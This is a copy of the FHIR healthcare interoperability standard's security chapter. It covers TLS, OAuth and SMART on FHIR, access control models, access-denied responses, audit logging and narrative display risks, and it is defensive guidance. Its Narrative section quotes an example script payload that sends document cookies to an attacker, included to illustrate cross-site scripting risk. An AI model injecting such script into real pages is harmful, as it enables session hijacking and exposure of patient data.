# FHIR and security

https://build.fhir.org/security.html

FHIR (Fast Healthcare Interoperability Resources) ensures data security by leveraging modern, standard protocols for authentication, authorization, and encryption, specifically relying on OAuth 2.0 and the SMART on FHIR framework to secure APIs. It provides robust, built-in mechanisms for security labeling, auditing, and access control to ensure only authorized users access sensitive information.

Core FHIR Security Components

- Authentication & Authorization: FHIR heavily relies on SMART on FHIR, which utilizes OAuth 2.0 to manage user access and application authorization. Other frameworks like UDAP (Unified Data Access Profiles) are also used for scalable registration and security.

- Encryption: All communication, especially over APIs, should be encrypted using TLS to prevent unauthorized access.

- Access Control: The FHIR standard uses patient compartment definitions to determine if a resource belongs to a specific patient, assisting in restricting data access.

- Security Labeling: FHIR allows for data to be tagged with security labels to control access, ensuring that sensitive information is only visible to authorized personnel.

- Audit Trails: Full audit logs are essential in FHIR implementations to detect anomalous access patterns.

- Safety Checklists: Implementers should use the FHIR Implementer's Safety Checklist to ensure all design aspects consider security.

Key Security Resources

- FHIR Security Module: Defines the overall security framework, including audit and encryption standards.

- SMART on FHIR: A widely adopted framework that enhances FHIR API security.

- US Core Security: Provides specific security requirements and guidance for the US realm.

- UDAP Security: Focused on scalable, secure API access.

FHIR Security
Responsible Owner: Security icon Work Group Standards Status: Normative
Fast Healthcare Interoperability Resources (FHIR) is not a security protocol, nor does it define any security related functionality. However, FHIR does define exchange protocols and content models that need to be used with various security protocols defined elsewhere. This section gathers all information about security in one section. A summary:

Time Keeping - all clocks SHOULD be synchronized using NTP/SNTP, and the design of the system SHOULD be robust against a system clock with the wrong value
Communications Security - all exchange of production data SHOULD be secured using TLS (e.g., https).
Authentication - Users/Clients must be authenticated. For web-centric, OAuth is recommended, consider use of HL7 SMART App Launch icon Implementation Guide where appropriate.
Authorization/Access Control - FHIR defines a Security Label infrastructure to support access control management. FHIR MAY also define a set of resources to administer access control management, but does not define any at present
Audit - FHIR defines provenance and audit event resources suitable for tracking the origins, authorship, history, status, and access of resources
Digital Signatures - FHIR includes several specifically reserved locations for digital signatures
Attachments - FHIR allows for binary resources and attachments. These have their own concerns
Labels - FHIR allows for set of security related tags that affect the way resources are handled
Data Management Policies - FHIR defines a set of capabilities to support data exchange. Not all the capabilities that FHIR enables MAY be appropriate or legal for use in some combinations of context and jurisdiction (e.g., HIPAA, GDPR). It is the responsibility of implementers to ensure that relevant regulations and other requirements are met.
Narrative - Care must be taken when displaying the narrative from FHIR resources
Input Validation - Validate all input received from other actors to assure the data is well formed and does not contain content that would cause unwanted system behavior. Testing ensures that the input is not susceptible to data input validation errors by using techniques such as fuzzing, invalid input attacks, and injection attacks.
When using OAuth - Consider the draft Best-Current-Practice for OAuth icon
Security / Privacy Event Reporting - Consider legal obligations and ethical obligations to provide a means for Security and/or Privacy Event Reporting such as security vulnerability, or breach.
Time critical concerns regarding security flaws in the FHIR specification SHOULD be addressed to the FHIR email list icon for prompt consideration.

6.1.0.1 General Considerations
A production FHIR system will need some kind of security sub-system that administers users, user authentication, and user authorization. Where this subsystem fits into the deployment architecture is a matter for system design:

    The consumer that is using a healthcare related system
    The client application the user is using (application, mobile app, website, etc.)
    The security system (authentication and access control)
    The clinical/healthcare repository

In this diagram, the red lines represent FHIR interfaces. From the perspective of the FHIR API, the client (consumer of FHIR services) MAY either interact with a security system that manifests as a FHIR server, and which depends on a subsequent FHIR interface to provide the actual storage, or either the client or server interacts with the security system independently. In each of these 3 scenarios, the different components MAY be assembled into applications or network components differently, but the same logical layout applies. The FHIR specification assumes that a security system exists, and that it MAY be deployed in front of or behind the FHIR API.

The security system includes the following subsystems:

Authentication: identifies and authenticates the user
Access Control decision engine: decides whether FHIR operations are allowed
Audit Log: records actions to allow for subsequent review and detection of intrusion or inappropriate usage
Because there are a plethora of standards relating to the administration and functionality of the security system, FHIR does not provide user, profile, or other such administration resources. Instead, the FHIR resources are the targets of the policies expressed in these other approaches. What FHIR does specify is a way to apply security labels to resources so that a security system MAY use these (along with the contents of the resources if appropriate) to determine whether a user is authorized to perform a particular FHIR operation or not.

6.1.0.2 Security and Privacy Considerations
The appropriate protections for Privacy and Security are specific to the risks to Privacy and the risks to Security of that data being protected. This concept of appropriate protections is a very specific thing to the actual data. Any declaration of 'required' or 'optional' requirements that could be mentioned here are only recommendations for that kind of Resource in general for the most dominant use of that Resource. Where one uses the Resource in a way that is different than this most dominant use, one will have different risks and thus need different protections. Each Resource is indicated with the dominant "Security Category", and all of the Resources Security Category is shown on the Resource Types page with the Security Category tab.

Most Resources will need some form of Access Control to Create, Update, or Delete. The following general guidance is given only as general guidance for READ and QUERY access:

6.1.0.2.1 Anonymous READ Access Resources
These resources tend to not contain any individual data, or business sensitive data. Most often these Resources will be available for anonymous access, meaning there is no access control based on the user or system requesting. However, these Resources do tend to contain important information that must be authenticated back to the source publishing them, and protected from integrity failures in communication. For this reason, server authenticated https (TLS) is recommended to provide authentication of the server and integrity protection in transit. This is normal web-server use of https.

6.1.0.2.2 Business Sensitive Resources
These Resources tend to not contain any individual data, but do have data that describe business or service sensitive data. The use of the term Business is not intended to only mean an incorporated business, but rather the broader concept of an organization, location, or other group that is not identifiable as individuals. Often these resources will require some sort of client authentication to assure that only authorized access is given. The client access control MAY be to individuals, or MAY be to system identity. For this purpose, possible client authentication methods such as: mutual-authenticated-TLS, APIKey, App signed JWT, or App OAuth client-id JWT For example: an App that uses a Business protected Provider Directory to determine other business endpoint details.

6.1.0.2.3 Individual Sensitive
These Resources do NOT contain Patient data, but do contain individual information about other participants. These other individuals are Practitioners and PractitionerRole. These identities are needed to enable the practice of healthcare. These identities are identities under general privacy regulations, and thus must consider Privacy risk. Often access to these other identities are covered by business relationships. For this purpose, access to these Resources will tend to be Role specific using methods such as RBAC or ABAC.

6.1.0.2.4 Patient Sensitive
These Resources make up the bulk of FHIR and therefore are the most commonly understood. These Resources contain highly sensitive health information, or are closely linked to highly sensitive health information. These Resources will often use the security labels to differentiate various confidentiality levels within this broad group of Patient Sensitive data. Access to these Resources often requires a declared Purpose Of Use. Access to these Resources is often controlled by a Privacy Consent. See the section below on Authorization and Access Control.

6.1.0.2.5 No Dominant Category
Some Resources can be used for a wide scope of use-cases that span very sensitive to very non-sensitive. These Resources do not fall into any of the above classifications, as their sensitivity is highly variable. These Resources will need special handling. These Resources often contain metadata that describes the content in a way that can be used for Access Control decisions.

6.1.0.3 Communications
For the RESTful API, normal HTTP security rules apply. Please follow the HTTP specification Security Considerations section 9 icon. The Service Base URL will specify whether TLS is required. Client authentication MAY be required by the server, possibly including the requirement for client certificates. When returning responses to non-authorized clients, ensure that Hypertext Transfer Protocol (HTTP) headers of a web server and API error messages or faults do not disclose detailed information about the underlying web server that could be the source of potential exploitation.

Please follow IETF Best Current Practice (BCP 195 icon) - "Recommendations for Secure Use of Transport Layer Security (TLS) and Datagram Layer Security (DTLS)" icon.

Consider using additional methods of security for an API to help authenticate where Domain Name System (DNS) responses are coming from and ensure that they are valid. For example, the use of Domain Name System Security Extensions (DNSSEC), a suite of extensions that add security to the DNS protocol, can ensure that domains associated with API endpoints that transmit health information or information required for API access are secure. DNSSEC provides origin authority, data integrity, and authenticated denial of existence. With DNSSEC, the DNS protocol is much less susceptible to certain types of attacks, particularly DNS spoofing attacks.

The TLS communications are established prior to any HTTP command/response, so the whole FHIR interaction is protected by the TLS communications. The security of the endpoints of the TLS communications must be risk-managed, so as to prevent inappropriate risks (e.g., audit logging of the GET parameters into an unprotected audit log).

When it is desirable to support browser-based javascript client applications, servers SHOULD consider enabling cross-origin resource sharing (CORS) icon for the REST operations. Consider advice from sources including Enable-CORS icon and Moesif blog on Guide to CORS Pitfalls icon. Experience shows that this is an area where ongoing issues MAY be expected as security holes are found and closed on an ongoing basis.

6.1.0.4 Authentication
Except when no patient data are involved such as Provider Directories and test sandbox systems, FHIR servers need to authenticate the client system and trust it, or authenticate the individual user by a variety of techniques. For web-centric environments it is recommended to use OpenID Connect icon (or other suitable authentication protocol) to confirm the identity of the authenticated end user, where it is necessary that end-users be identified to the application.

For scalable security, either UDAP Consumer-Facing icon or UDAP Business-to-Business icon SHOULD be implemented, as appropriate. The Registration and Discovery sections of UDAP Security icon SHOULD also be implemented to securely scale the addition of new client and server endpoints. Tiered OAuth for User Authentication icon SHOULD be implemented to securely scale trust with new OIDC credential issuers.

All systems SHALL protect authenticator mechanisms, and select the type of credential/strength of authenticator based on use-case and risk management.

6.1.0.5 Authorization/Access Control
Correctly identifying people, devices, locations and organizations is one of the foundations that any security system is built on. Most applications of security protocols, whether authentication, access control, digital signatures, etc. rely on the correct mapping between the relevant resources and the underlying systems. Note that this isn't necessary. There is nothing in FHIR that requires or relies on any security being in place, or any particular security implementation. However, real-world usage will generally require this.

A holder of data SHOULD NOT allow the data to be communicated unless there are enough assurances that the other party is authorized to receive it. This is true for a client creating a resource through a PUT/POST, as much as it is true for a server returning resources on a GET. The presumption is that without proper authorization, to the satisfaction of the data holder, the data does not get communicated.

Two of the classic Access Control models are: Role-Based Access Control (RBAC), and Attribute-Based Access Control (ABAC).

In Role-Based Access Control (RBAC), permissions are operations on an object that a user wishes to access. Permissions are grouped into roles. A role characterizes the functions a user can perform. Roles are assigned to users. If the user's role has the appropriate permissions to access an object, then that user is granted access to the object. FHIR readily enables RBAC, as FHIR Resources are object types and the CRUDE (Create, Read, Update, Delete, Execute) events (the FHIR equivalent to permissions in the RBAC scheme) are operations on those objects.

In Attribute-Based Access Control (ABAC), a user requests to perform operations on objects. That user's access request is granted or denied based on a set of access control policies that are specified in terms of attributes and conditions. FHIR readily enables ABAC, as instances of a Resource in FHIR (again, Resources are object types) can have attributes associated with them. These attributes include security tags, environment conditions, and a host of user and object characteristics, which are the same attributes as those used in ABAC. Attributes help define the access control policies that determine the operations a user MAY perform on a Resource (in FHIR) or object (in ABAC). For example, a tag (or attribute) MAY specify that the identified Resource (object) is not to be further disclosed without explicit consent from the patient.

The rules behind the access control decision are often very complex, and potentially depend on information sourced from:

Client, such as user identity, user role, location, level of assurance
Resource, such as confidentiality, sensitivity, type of data, date ranges covered by the data, author of the data
Patient, such as the patient identity, patient relationship to the user, patient consent policies
Context of the transaction, system identity, time-of-day, token expiration, token scope, purpose of use, workflow state, and transport security
For one source of further information, see the IHE Access Control white paper icon

Access control constraints MAY result in data returned in a read or search being redacted or otherwise restricted. See Variations between Submitted data and Retrieved data.

6.1.0.5.1 Access Control Considerations
The FHIR RESTful API provides several ways that a client MAY request or create information. When designing a system to authorize access to information, all potential access methods must be considered. They include the following:
The basic CRUD methods on resources. A security implementation must evaluate whether a client can read, update create or delete a given resource.
Chained search provides the ability to disclose information on related resources. A security implementation must consider whether a client has the permission to access the resource being searched on, as well as the chained resource(s)
\_include and \_revinclude search parameters allow client to request related resources. A security implementation must determine if the client has access to the included resources.
security labels
Several resources, including Bundle, Composition, Group and List, are designed to contain other resources. A security implementation SHOULD consider whether access to an individual resource, such as a Bundle, SHOULD permit access to all resources contained within the resource.
FHIR defines several operations that MAY be supported by a server. Security implementations must evaluate whether a client can invoke these operations and what information SHOULD be returned from them. Fetch Encounter Record, Evaluate Measure, Observation Statistics, Find Patient Matches using MPI-based Logic, and Fetch Patient Record specifically provide the ability to disclose patient information.
Batch and transaction processing provide ways for clients to create and update information in bulk. Security implementations SHOULD consider whether a client can initiate one of these interactions and make authorization decisions on each action in the batch/transaction.
Security implementations must be aware of the Break the Glass protocol (e.g., break the glass) (example).
Audit of the Access Control Decision: Any Access Control decision to deny an activity SHALL be recorded, and Access Control decisions to permit access SHOULD be recorded. The record SHOULD use the FHIR AuditEvent Resource.
When an activity is specifically permitted or denied because of Consent terms, the Consent SHOULD be recorded in the AuditEvent as an AuditEvent.entity (example)
6.1.0.5.2 Approaches to Implementing Access Control
It is recommended that OAuth icon be used to authenticate and/or authorize the client and user. The HL7 SMART App Launch icon Implementation Guide is a recommended method for using OAuth for authorizing interactions with a protected FHIR Server.

The method today for managing and enforcing patient consents in Patient-Directed and Patient-Mediated workflows relies on an OAuth 2.0 server which uses the patient consents as the applicable authorization policies at the time of issuing a token. In this model, the authorization server (OAuth 2.0 or its User-Managed Access profile icon) examines the patient consent to determine whether or not to issue a token to a requesting client and what scopes to grant.

The HEART Working Group icon has developed a set of privacy and security specifications that enable an individual to control the authorization of access to RESTful health-related data sharing APIs, and to facilitate the development of interoperable implementations of these specifications by others.

The main motivation behind this model is to have a separate consent management system in charge of collecting, storing, and maintaining patient consents, as well as responding to authorization requests based on these consents. This would allow organizations to outsource their consent management functions to a consent management service. Further details about this model are discussed in this report icon.

IHE IUA Profile icon constrains OAuth token attributes to support Healthcare Information Exchange environments such as IHE Document Sharing icon. IHE includes guidance on access control within this whitepaper and has implementation guides.

An extension to a single level model, Cascaded Authorization, enables an OAuth/UMA authorization server to require and rely on the approval of another OAuth/UMA server before issuing a token and granting scopes. Using this model, the enterprise OAuth/UMA server at a provider organization can rely on the decisions by a Consent OAuth/UMA Server by requiring and accepting access tokens issued by that server as part of the client authorization process. This architecture preserves the independence of a consent management system, which can potentially be outsourced to third-parties, while ensuring that all authorization interfaces and interactions follow the OAuth/UMA protocols. A summary of the concepts and flows for Cascaded Authorization are discussed in this report icon. Further extensions to this model to leverage UMA’s capabilities to simplify some of the flows are discussed in this report icon. A reference implementation of Cascaded Authorization and more technical details can be found here icon.

For business to business workflows, the UDAP B2B Authorization Extension Object icon can be used to assert consent information in communities supporting cross-organization FHIR based exchanges.

6.1.0.5.3 Access Denied Response Handling
A web-server, especially hosting FHIR, must choose the response carefully when an Access Denied condition exists. Returning too much information MAY expose details that SHOULD NOT be communicated. The Access Denied condition might be because of missing but required Authentication, the user is not authorized to access the endpoint, the user is not authorized to access specific data, or other policy reasons.

To balance usability of the returned result vs appropriate protection, the actual result method used needs to be controlled by policy and context. Typical methods of handling Access Denied used are:

Return a Success with Bundle containing zero results - This result is indistinguishable from the case where no data is known. When consistently returned on Access Denied, this will not expose which patients exist, or what data might be blinded. This method is also consistent with cases where some results are authorized while other results are blinded. This can only be used when returning a Bundle is a valid result.

Return a 404 "Not Found" - This also protects from data leakage as it is indistinguishable from a query against a resource that doesn't exist. It does however leak that the user authentication is validated.

Return a 403 "Forbidden" - This communicates that the reason for the failure is an Authorization failure. It SHOULD only be used when the client and/or user is well enough known to be given this information. Thus this method is most used when the user can know that they are forbidden access. It doesn't explain how the user might change things to become authorized.

Return a 401 "Unauthorized" - This communicates that user authentication was attempted and failed to be authenticated.

Note that if a server allows PUT to a new location, it is not feasible to return 404 Not Found. This means that clients can use this to test whether content exists that they are not able to access, which is a minor, but potentially significant, leak of information.

6.1.0.6 Audit Logging
FHIR provides an AuditEvent resource suitable for use by FHIR clients and servers to record when a security or privacy relevant event has occurred. This form of audit logging records as much detail as reasonable at the time the event happened. IHE Basic Audit Log Patterns Implementation Guide icon has profiling of the AuditEvent resource for security and privacy purposes including patterns for RESTful events, RESTful patient affecting events, Authorization Decisions, and Accounting of Disclousures.

When used to record security and privacy relevant events, the AuditEvent can then be used by properly authorized applications to support audit reporting, alerting, filtering, and forwarding. This model has been developed and used in healthcare for a decade as IHE-ATNA profile icon. ATNA log events can be automatically converted to AuditEvent resources, and from there, client applications are able to search the audit events, or subscribe to them.

For HTTP logs, implementers need to consider the implications of distributing access to the logs. HTTP logs, including those that only contain the URL itself, SHOULD be regarded as being as sensitive as the resources themselves. Even if direct PHI (Personal health information) is kept out of the logs by careful avoidance of search parameters (e.g., by using POST), the logs will still contain a rich set of information about the clinical records.

6.1.0.7 Attachments
Several FHIR resources include attachments. Attachments can either be references to content found elsewhere or included inline encoded in base64. Attachments represent security risks in a way that FHIR resources do not, since some attachments contain executable code. Implementers SHOULD always use caution when handling resources.

6.1.0.8 Security Labels
See Security Labels.

6.1.0.9 Narrative
FHIR resources include an XHTML narrative, so that applications can display the contents of the resource to users without having to fully and correctly process the data in the resource. However, displaying HTML is associated with several known security issues that have been observed in production systems in other contexts (e.g., with CDA icon). For this reason, the FHIR narrative can't contain active content. However, care is still needed when displaying the narrative:

Validate the narrative (the standard FHIR schemas do not allow active content, and the reference implementations won't handle it). Note, though, that external references could still be included in CSS, and removing/preventing these are outside the scope of schemas and reference implementations.
Ensure that any external references to images or anchors (e.g., outside the resource) do not cause the display software to leak sensitive information in headers icon
Do not allow external links to run in a privileged context such as the EHR unless you are sure they can be trusted
Care SHOULD be taken to differentiate HTTP RESTful (API) from browser-based server content. Specifically, one SHOULD separate user session cookies, as an attacker could create content that serves up with content-type "text/html" and has content like "<script>send_to_attacker(document.cookie);</script>".
Also note that the inclusion of an external reference to an image can allow the server that hosts the image to track when the resource is displayed. This MAY be a feature or a problem depending on the context.

In addition to narrative, Documents MAY also contain stylesheets. Unlike with CDA, the stylesheets are simple CSS stylesheets, not executable XSLT, so the same security risks do not apply. However, CSS stylesheets MAY still reference external content (e.g., background images), and applications displaying documents SHOULD ensure that CSS links are not automatically followed without checking their safety first, and that session/identifying information does not leak with any use of external links.
